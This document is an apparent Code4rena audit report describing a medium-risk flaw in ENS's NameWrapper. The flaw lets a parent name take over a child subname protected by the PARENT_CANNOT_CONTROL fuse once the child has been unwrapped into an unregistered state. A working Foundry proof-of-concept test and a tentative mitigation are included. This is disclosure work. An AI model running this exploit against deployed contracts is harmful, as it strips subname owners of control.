## Tags

- bug
- 2 (Med Risk)
- selected for report
- sponsor confirmed
- M-03

# [NameWrapper: Wrapped to Unregistered to ignore `PARENT_CANNOT_CONTROL`](https://github.com/code-423n4/2022-11-ens-findings/issues/8) 

# Lines of code

https://github.com/code-423n4/2022-11-ens/blob/2b0491fee2944f5543e862b1e5d223c9a3701554/contracts/wrapper/NameWrapper.sol#L512
https://github.com/code-423n4/2022-11-ens/blob/2b0491fee2944f5543e862b1e5d223c9a3701554/contracts/wrapper/NameWrapper.sol#L550


# Vulnerability details

## Impact

- owner of a wrapped node without `CANNOT_UNWRAP` fuse can unwrap and set the `ens.owner(node)` to zero to be an unregistered state
- if it happens, even if the node has `PARENT_CANNOT_CONTROL` fuse, the parent of the node can change the `NameWrappwer.owner` of the node

## Proof of Concept

Below is a snippet of the proof of concept. The whole code can be found in [this gist](https://gist.github.com/zzzitron/7670730176e35d7b2322bc1f4b9737f0#file-2022-11-ens-versus-poc-t-sol). And how to run test is in the comment in the gist.


In the proof of concept below, the parent node is `vitalik.eth` and the child node is `sub1.vitalik.eth`.
The parent node has `PARENT_CANNOT_CONTROL`, `IS_DOT_ETH` and `CANNOT_UNWRAP` and the child node has `PARENT_CANNOT_CONTROL`.

The child node unwraps itself and set the owner on `ens` contract to the `address(0)` or `address(ens)`, which will make the child node to unregistered state even before expiry of the node.

Since technically the child node is unregistered, the parent can now 'create' the 'unregistered' node `sub1.vitalik.eth` by simply calling `setSubnodeRecord`. By doing so, the parent can take control over the child node, even though the `PARENT_CANNOT_CONTROL` fuse was set and it was before expiry.

```solidity
    function testM4WrappedToUnregistered() public {
        string memory parent = 'vitalik.eth';
        string memory sub1_full = 'sub1.vitalik.eth';
        string memory sub1 = 'sub1';
        (, bytes32 parent_node) = parent.dnsEncodeName();
        (bytes memory sub1_dnsname, bytes32 sub1_node) = sub1_full.dnsEncodeName();

        // wrap parent and lock
        vm.prank(user1);
        registrar.setApprovalForAll(address(nameWrapper), true);
        vm.prank(user1);
        nameWrapper.wrapETH2LD('vitalik', user1, uint16(CANNOT_UNWRAP), address(0));
        // checks
        (address owner, uint32 fuses, uint64 expiry) = nameWrapper.getData(uint256(parent_node));
        assertEq(owner, user1);
        assertEq(fuses, PARENT_CANNOT_CONTROL | IS_DOT_ETH | CANNOT_UNWRAP);
        assertEq(expiry, 2038123728);

        // subnode
        vm.prank(user1);
        nameWrapper.setSubnodeOwner(parent_node, 'sub1', user2, PARENT_CANNOT_CONTROL, 1700000000);
        (owner, fuses, expiry) = nameWrapper.getData(uint256(sub1_node));
        assertEq(owner, user2);
        assertEq(fuses, PARENT_CANNOT_CONTROL);
        assertEq(expiry, 1700000000);

        // parent cannot set record on the sub1
        vm.expectRevert(abi.encodeWithSelector(OperationProhibited.selector, sub1_node));
        vm.prank(user1);
        nameWrapper.setSubnodeRecord(parent_node, sub1, user1, address(1), 10, 0, 0);

        // parent: pcc cu
        // child: pcc

        // unwrap sub and set the ens owner to zero -> now parent can change owner
        vm.prank(user2);
        nameWrapper.unwrap(parent_node, _hashLabel(sub1), address(ens));
        assertEq(ens.owner(sub1_node), address(0));

        // sub node has PCC but parent can set owner, resolve and ttl
        vm.prank(user1);
        nameWrapper.setSubnodeRecord(parent_node, sub1, address(246), address(12345), 111111, 0, 0);
        (owner, fuses, expiry) = nameWrapper.getData(uint256(sub1_node));
        assertEq(owner, address(246));
        assertEq(fuses, PARENT_CANNOT_CONTROL);
        assertEq(expiry, 1700000000);
        assertEq(ens.resolver(sub1_node), address(12345));
        assertEq(ens.ttl(sub1_node), 111111);

        // can change fuse as the new owner of sub1
        vm.prank(address(246));
        nameWrapper.setFuses(sub1_node, uint16(CANNOT_UNWRAP));
        (owner, fuses, expiry) = nameWrapper.getData(uint256(sub1_node));
        assertEq(owner, address(246));
        assertEq(fuses, PARENT_CANNOT_CONTROL | CANNOT_UNWRAP);
        assertEq(expiry, 1700000000);
        assertEq(ens.resolver(sub1_node), address(12345));
        assertEq(ens.ttl(sub1_node), 111111);
    }
```

It is unlikely that the child node will set the owner of the ENS Registry to zero. But hypothetically, the owner of the child node wanted to "burn" the subnode thinking that no one can use it until the expiry. In that case the owner of the parent node can just take over the child node.


## Tools Used

foundry

## Recommended Mitigation Steps

Unclear, but consider using `ENS.recordExists` instead of checking the `ENS.owner`.


<!-- zzzitron M04 -->

